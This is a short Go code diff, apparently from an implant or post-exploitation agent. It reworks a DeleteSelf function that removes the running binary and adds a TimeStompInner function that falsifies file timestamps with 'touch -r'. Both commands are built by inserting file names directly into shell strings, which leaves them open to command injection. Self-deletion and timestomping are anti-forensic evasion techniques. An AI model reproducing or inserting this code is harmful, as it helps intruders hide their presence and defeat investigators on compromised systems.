@@ -17,9 +17,16 @@ func DeleteSelf() {
 		if err != nil {
 			return
 		}
-		cmd := exec.Command("/bin/bash", "-c", "rm -f "+string(selfName))
-		err = cmd.Start()
+		_ = Exec([]byte(util.Sprintf("rm -f %s", selfName)))
 	}
+}
+
+func TimeStompInner(b []byte) error {
+	to, from, err := parseTimeStomp(b)
+	if err != nil {
+		return err
+	}
+	return Exec([]byte(util.Sprintf("touch -c -r %s %s", string(from), string(to))))
 }
 
 func Exec(b []byte) error {
